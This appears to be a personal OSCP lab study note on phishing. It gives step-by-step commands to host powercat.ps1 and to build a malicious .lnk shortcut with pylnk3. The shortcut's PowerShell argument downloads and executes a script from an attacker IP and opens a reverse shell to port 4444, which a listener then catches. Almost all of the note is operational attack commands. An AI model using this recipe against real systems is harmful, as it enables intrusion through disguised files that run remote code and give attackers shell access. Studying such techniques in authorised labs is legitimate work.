[[Phishing]]

Activate pylnk
```
python3 -m venv .venv  && source .venv/bin/activate && pip install pylnk3
```

cd to machine directory
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const machine = page?.MACHINE ?? "NO MACHINE FOUND";

const command = `cd ~/Desktop/PEN200/${machine}`;

dv.paragraph("```bash\n" + command + "\n```");
```

Host Powercat.ps1 for pylink3 to grab

```
cd ~/Desktop/Tools/Windows && python -m http.server 80
```

Create documents.link (edit machine path and both KALI IP) 

```
pylnk3 c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" ~/Desktop/PEN200/Beyond/webdav/documents.lnk \
  --arguments '-c "IEX(New-Object System.Net.WebClient).DownloadString(\"http://192.168.45.222:80/powercat.ps1\"); powercat -c 192.168.45.222 -p 4444 -e powershell"'
```

Start listener on KALI ATTACKER

```
cd ~/Desktop/Tools && python3 penelope.py -p 4444
```

[[SWAKS]]